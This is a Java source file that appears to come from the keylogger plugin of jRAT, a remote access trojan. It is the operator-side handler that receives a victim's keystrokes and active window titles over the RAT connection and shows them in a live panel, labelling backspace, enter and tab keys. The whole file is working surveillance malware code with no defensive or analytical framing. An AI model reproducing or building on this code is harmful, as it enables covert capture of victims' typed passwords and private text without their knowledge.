
package se.jrat.plugin.keylogger.client;

import jrat.api.Client;
import jrat.api.net.PacketListener;
import se.jrat.plugin.keylogger.client.ui.PanelKeylogger;

public class PacketStatus extends PacketListener {

	@Override
	public void perform(Client client) {
		try {
			int len = client.getDataInputStream().readInt();
			
			PanelKeylogger panel = (PanelKeylogger) KeyloggerPlugin.entry.get(client);
			
			for (int i = 0; i < len; i++) {
				boolean isKey = client.getDataInputStream().readBoolean();

				if (isKey) {
					char ckey = client.getDataInputStream().readChar();

					String key = Character.toString(ckey);

					if (ckey == '\b') {
						key = "[BACKSPACE]";
					} else if (ckey == '\n' || ckey == '\r') {
						key = "[ENTER]\r\n";
					} else if (ckey == '\t') {
						key = "[TAB]\t";
					}

					if (panel != null) {
						panel.appendOnline(key);
					}
				} else {
					String title = client.getDataInputStream().readUTF();

					if (panel != null) {
						panel.appendOnline("[Window: " + title + "]");
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
